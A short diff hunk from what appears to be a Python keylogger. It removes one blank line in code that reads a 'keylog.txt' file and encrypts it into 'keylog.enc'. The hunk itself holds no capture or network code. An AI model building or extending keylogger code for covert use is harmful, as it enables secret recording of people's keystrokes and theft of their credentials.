@@ -173,7 +173,6 @@ except Exception as e:
 try:
     with open("keylog.txt", "rb") as file:
         log_data = file.read()
-
     encrypted_data = cipher_suite.encrypt(log_data)
 
     with open("keylog.enc", "wb") as file:
